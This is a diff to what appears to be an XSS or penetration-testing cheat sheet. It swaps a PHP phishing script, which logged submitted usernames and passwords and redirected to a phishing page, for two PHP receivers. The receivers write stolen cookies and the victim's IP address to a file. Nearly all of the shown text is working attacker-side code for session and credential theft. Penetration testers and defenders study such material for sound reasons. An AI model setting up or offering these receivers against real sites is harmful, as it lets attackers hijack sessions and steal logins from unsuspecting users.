@@ -193,13 +193,26 @@ As these functions write raw text to the HTML code, if any user input goes into 
 
 ```
 <?php
-if (isset($_GET['username']) && isset($_GET['password'])) {
-    $file = fopen("creds.txt", "a+");
-    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
-    header("Location: http://SERVER_IP/phishing/index.php");
-    fclose($file);
-    exit();
+if (isset($_GET['c'])) {
+    $list = explode(";", $_GET['c']);
+    foreach ($list as $key => $value) {
+        $cookie = urldecode($value);
+        $file = fopen("cookies.txt", "a+");
+        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
+        fclose($file);
+    }
 }
+?>
+```
+
+#### PHP write capture to file
+
+```
+<?php
+$cookie = $_GET['c'];
+$fp = fopen('cookies.txt', 'a+');
+fwrite($fp, 'Cookie:' .$cookie."\r\n");
+fclose($fp);
 ?>
 ```
 
